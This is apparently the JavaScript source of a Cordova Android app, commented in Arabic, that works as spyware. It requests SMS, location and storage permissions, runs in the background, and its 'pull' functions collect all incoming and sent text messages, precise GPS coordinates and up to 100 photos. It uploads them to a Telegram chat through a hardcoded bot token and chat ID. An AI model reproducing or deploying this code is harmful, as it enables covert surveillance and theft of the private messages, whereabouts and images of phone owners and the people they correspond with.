document.addEventListener('deviceready', onDeviceReady, false);

// متغيرات التطبيق
let botToken = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"; // استبدل ب token بوتك
let chatId = "5739065274"; // استبدل ب chat id الخاص بك
let appRunning = false;

function onDeviceReady() {
    console.log('Cordova جاهز');
    requestPermissions();
    sendToTelegram("الجهاز متصل");
    createTransparentButtons();
    appRunning = true;
    
    // لجعل التطبيق يعمل في الخلفية
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.on('activate', function() {
        cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
}

function requestPermissions() {
    var permissions = cordova.plugins.permissions;
    var permissionList = [
        permissions.READ_EXTERNAL_STORAGE,
        permissions.WRITE_EXTERNAL_STORAGE,
        permissions.ACCESS_FINE_LOCATION,
        permissions.ACCESS_COARSE_LOCATION,
        permissions.READ_SMS,
        permissions.RECEIVE_SMS,
        permissions.FOREGROUND_SERVICE
    ];
    
    permissions.requestPermissions(
        permissionList,
        function(status) {
            if (status.hasPermission) {
                console.log("تم منح الأذونات بنجاح");
            } else {
                console.log("تم رفض بعض الأذونات");
            }
        },
        function(error) {
            console.warn("فشل طلب الأذونات", error);
        }
    );
}

function createTransparentButtons() {
    // زر عرض الأوامر الرئيسي
    const mainBtn = document.createElement('button');
    mainBtn.innerHTML = 'أوامر السحب';
    mainBtn.style.position = 'fixed';
    mainBtn.style.bottom = '20px';
    mainBtn.style.right = '20px';
    mainBtn.style.zIndex = '9999';
    mainBtn.style.opacity = '0.7';
    mainBtn.style.padding = '10px';
    mainBtn.style.borderRadius = '50%';
    mainBtn.style.backgroundColor = '#333';
    mainBtn.style.color = 'white';
    mainBtn.style.border = 'none';
    mainBtn.onclick = function() {
        showPullCommands();
    };
    document.body.appendChild(mainBtn);
}

function showPullCommands() {
    // إزالة الأزرار القديمة إذا كانت موجودة
    const oldBtns = document.querySelectorAll('.pull-btn');
    oldBtns.forEach(btn => btn.remove());
    
    // إنشاء الأزرار الثلاثة
    const commands = [
        {text: 'سحب رسائل SMS', action: pullSMS},
        {text: 'سحب الموقع الجغرافي', action: pullLocation},
        {text: 'سحب الصور', action: pullImages}
    ];
    
    commands.forEach((cmd, index) => {
        const btn = document.createElement('button');
        btn.className = 'pull-btn';
        btn.innerHTML = cmd.text;
        btn.style.position = 'fixed';
        btn.style.bottom = (80 + (index * 60)) + 'px';
        btn.style.right = '20px';
        btn.style.zIndex = '9999';
        btn.style.opacity = '0.7';
        btn.style.padding = '10px';
        btn.style.borderRadius = '5px';
        btn.style.backgroundColor = '#333';
        btn.style.color = 'white';
        btn.style.border = 'none';
        btn.style.width = '150px';
        btn.onclick = cmd.action;
        document.body.appendChild(btn);
    });
}

function pullSMS() {
    sendToTelegram("بدأ سحب رسائل SMS...");
    
    // فصل الرسائل الواردة والصادرة
    let inboxSMS = [];
    let sentSMS = [];
    
    if (typeof SMS !== 'undefined') {
        SMS.listSMS({}, function(data) {
            data.forEach(msg => {
                if (msg.type === 1) { // رسائل واردة
                    inboxSMS.push(`من: ${msg.address}\nالرسالة: ${msg.body}\nالتاريخ: ${new Date(msg.date).toLocaleString()}`);
                } else if (msg.type === 2) { // رسائل صادرة
                    sentSMS.push(`إلى: ${msg.address}\nالرسالة: ${msg.body}\nالتاريخ: ${new Date(msg.date).toLocaleString()}`);
                }
            });
            
            // إنشاء ملفات وإرسالها
            createAndSendFile('inbox_sms.txt', inboxSMS.join('\n\n'));
            createAndSendFile('sent_sms.txt', sentSMS.join('\n\n'));
            
            sendToTelegram("تم سحب رسائل SMS بنجاح");
        }, function(err) {
            sendToTelegram("فشل سحب رسائل SMS: " + err);
        });
    } else {
        sendToTelegram("لا يوجد دعم لقراءة SMS في هذا الجهاز");
    }
}

function pullLocation() {
    sendToTelegram("بدأ سحب الموقع الجغرافي...");
    
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const timestamp = new Date(position.timestamp).toLocaleString();
            
            const locationText = `الموقع الجغرافي:\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy} متر\nالوقت: ${timestamp}`;
            
            // إرسال النص
            sendToTelegram(locationText);
            
            // إرسال رابط الخريطة
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            sendToTelegram(`رابط الخريطة: ${mapUrl}`);
        },
        function(error) {
            sendToTelegram("فشل الحصول على الموقع: " + error.message);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
    );
}

function pullImages() {
    sendToTelegram("بدأ سحب الصور...");
    
    window.imagePicker.getPictures(
        function(results) {
            if (results.length > 0) {
                sendToTelegram(`تم العثور على ${results.length} صورة. جاري الإرسال...`);
                
                // إرسال كل صورة
                results.forEach((imageUri, index) => {
                    uploadFileToTelegram(imageUri, 'image_' + (index+1) + '.jpg');
                });
            } else {
                sendToTelegram("لم يتم العثور على أي صور في الجهاز");
            }
        },
        function(error) {
            sendToTelegram("فشل سحب الصور: " + error);
        },
        { 
            maximumImagesCount: 100,
            width: 800,
            quality: 80
        }
    );
}

function createAndSendFile(filename, content) {
    window.resolveLocalFileSystemURL(cordova.file.externalRootDirectory, function(dirEntry) {
        dirEntry.getFile(filename, { create: true }, function(fileEntry) {
            fileEntry.createWriter(function(fileWriter) {
                fileWriter.onwriteend = function() {
                    uploadFileToTelegram(fileEntry.toURL(), filename);
                };
                
                fileWriter.onerror = function(e) {
                    sendToTelegram("فشل إنشاء الملف: " + e.toString());
                };
                
                fileWriter.write(content);
            });
        });
    });
}

function uploadFileToTelegram(fileUri, filename) {
    const options = new FileUploadOptions();
    options.fileKey = "document";
    options.fileName = filename;
    options.mimeType = "application/octet-stream";
    options.chunkedMode = false;
    
    const ft = new FileTransfer();
    ft.upload(
        fileUri,
        `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`,
        function(result) {
            console.log("تم إرسال الملف بنجاح: " + filename);
        },
        function(error) {
            console.log("فشل إرسال الملف: " + error.code);
        },
        options
    );
}

function sendToTelegram(message) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, true);
    xhr.send();
}

// لجعل التطبيق يعمل عند التشغيل
function enterApp() {
    document.getElementById("message").innerText = "التطبيق يعمل في الخلفية";
    if (!appRunning) {
        onDeviceReady();
    }
}
